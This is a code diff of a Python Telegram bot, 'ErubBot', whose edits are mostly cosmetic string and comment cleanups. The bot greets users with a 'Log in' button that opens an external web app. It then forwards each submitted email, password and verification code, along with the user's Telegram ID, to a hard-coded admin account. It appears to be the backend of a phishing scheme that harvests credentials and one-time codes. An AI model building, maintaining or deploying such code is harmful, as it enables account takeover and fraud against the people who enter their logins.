@@ -6,17 +6,15 @@ from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.request import HTTPXRequest
 
-# ==================== КОНФИГ ====================
 BOT_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 ADMIN_ID_STR = os.environ.get("ADMIN_ID", "8542901240")
 WEB_APP_URL = "https://alexandersvet2711-sys.github.io/erub/"
-# ===============================================
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 if not BOT_TOKEN:
-    logger.error("❌ ОШИБКА: BOT_TOKEN не найден!")
+    logger.error("❌ BOT_TOKEN не найден!")
     exit(1)
 
 ADMIN_ID = int(ADMIN_ID_STR)
@@ -31,10 +29,7 @@ class ErubBot:
             .build()
             
         self.app.add_handler(CommandHandler("start", self.start))
-        
-        # ЛОВИМ ДАННЫЕ ОТ tg.sendData()
         self.app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, self.handle_webapp_data))
-        
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
 
     async def start(self, update: Update, context):
@@ -42,14 +37,14 @@ class ErubBot:
         try:
             await self.app.bot.send_message(
                 chat_id=ADMIN_ID,
-                text=f"🟢 НОВЫЙ ВХОД!\n\n👤 ID: `{user.id}`\n👤 Имя: {user.first_name}",
+                text=f"🟢 НОВЫЙ ВХОД!\n👤 ID: `{user.id}`\n👤 Имя: {user.first_name}",
                 parse_mode="Markdown"
             )
         except Exception as e:
             logger.error(f"Ошибка: {e}")
 
         await update.message.reply_text(
-            f"👋 Привет, {user.first_name}!\n\nНажмите кнопку ВНИЗУ:",
+            f"👋 Привет, {user.first_name}!\nНажмите кнопку ВНИЗУ:",
             reply_markup=ReplyKeyboardMarkup(
                 [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                 resize_keyboard=True
@@ -74,10 +69,7 @@ class ErubBot:
         titles = {"login": "🔔 ВХОД", "eid": "🆔 E-ID"}
         title = titles.get(t, "ДАННЫЕ")
 
-        text = f"<b>{title}</b>\n\n"
-        text += f"👤 TG ID: <code>{user.id}</code>\n"
-        text += f"👤 Имя: {user.first_name}\n\n"
-        
+        text = f"<b>{title}</b>\n\n👤 TG ID: <code>{user.id}</code>\n👤 Имя: {user.first_name}\n\n"
         if e != '-': text += f"📧 Email: <code>{e}</code>\n"
         if p != '-': text += f"🔑 Пароль: <code>{p}</code>\n"
         if code != '-': text += f"🔢 Код: <code>{code}</code>\n"
@@ -90,7 +82,6 @@ class ErubBot:
         await update.message.reply_text("ℹ️ Используйте кнопку «Войти»")
 
     def run(self):
-        print("🚀 БОТ ЗАПУЩЕН")
         self.app.run_polling()
 
 if __name__ == "__main__":
